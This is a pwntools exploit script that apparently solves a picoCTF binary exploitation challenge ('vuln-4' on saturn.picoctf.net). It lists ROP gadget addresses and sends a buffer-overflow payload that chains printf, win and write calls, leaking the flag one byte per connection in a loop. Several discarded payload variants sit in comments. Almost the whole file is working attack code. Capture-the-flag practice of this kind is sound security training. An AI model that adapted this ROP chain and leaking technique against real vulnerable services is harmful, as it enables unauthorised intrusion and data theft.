from pwn import *

context(terminal=['tmux','new-window'])

local, debug = True,  False
host, port ='saturn.picoctf.net', 60186

fname = './vuln-4'

#r = process(fname) if local else remote(host, port)
p = ELF(fname)

def title():
	log.info(r.recvline())

def send_payload(p):
	log.info('Sending malicious payload')
	r.sendline(p)

if __name__=='__main__':
	pushal_calledi = 0x0808193b
	pop_edi_ret = 0x08075079
	call_printf = 0x8051340
	pushal_3pop = 0x080a29ac
	pop3 = 0x0804b3cd
	pop4 = 0x08049846
	ret = 0x807507b
	push_eax_ret= 0x080b083a
	push_eax_call_esi = 0x0805a946
	pop_esi_ret = 0x0804afba
	push_eax_edi_call_esi= 0x0805abaa
	pop_edx_ebx_ret = 0x0805eea9
	push_eax_junk_call_edx = 0x08049ce7
		
	inc_eax_ret = 0x08088e0e
	#add_al_ret = 0x08088e0e
	#if debug:
		#gdb.attach(r,'b *0x08049e19\nc')
	#r = process(fname) if local else remote(host, port)
	
	#title()
	#send_payload(b'a'*10+p32(call_printf)+p32(p.sym['win'])+p32(pop_esi_ret)+p32(p.sym['write'])+p32(pop_edi_ret)+p32(0x1)+p32(inc_eax_ret)+p32(push_eax_edi_call_esi)+p32(0x100))

	#r.recvline()
	#r.interactive()	
	#send_payload(b'a'*10+b'b'*4+p32(p.sym['win'])+pop_7_times+  p32(call_printf) + p32(pushal_calledi))
	#send_payload(b'a'*10+p32(call_printf)+p32(p.sym['win'])+p32(pop_esi_ret)+p32(p.sym['write'])+p32(pop_edi_ret)+p32(0x1)+p32(push_eax_edi_call_esi)+p32(0x200))
	fl = ''
	#exit()
	for i in range(90):
		r = process(fname) if local else remote(host, port)
		title()
		leak_c = p32(inc_eax_ret)*i
		send_payload(b'a'*10+p32(call_printf)+p32(p.sym['win'])+p32(pop_esi_ret)+p32(p.sym['write'])+p32(pop_edi_ret)+p32(0x1)+leak_c+p32(push_eax_edi_call_esi)+p32(0x1))

		print(r.recvline())
		fl+=r.recv(1).decode()
		if fl[-1] == '}':
			break
		r.close()
	print(fl)	












